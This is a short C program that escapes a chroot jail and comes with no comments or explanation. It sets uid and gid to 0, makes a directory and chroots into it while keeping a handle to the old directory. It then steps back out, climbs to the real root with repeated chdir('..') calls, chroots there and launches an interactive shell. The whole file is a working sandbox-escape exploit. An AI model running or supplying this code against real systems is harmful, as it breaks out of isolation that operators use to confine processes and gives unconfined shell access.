#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    int dir_fd, x;
    setuid(0);
    setgid(0);
    mkdir("._.", 0755);
    dir_fd = open(".", O_RDONLY);
    chroot("._.");
    fchdir(dir_fd);
    close(dir_fd);
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");
    return execl("/bin/sh", "-i", NULL);
}
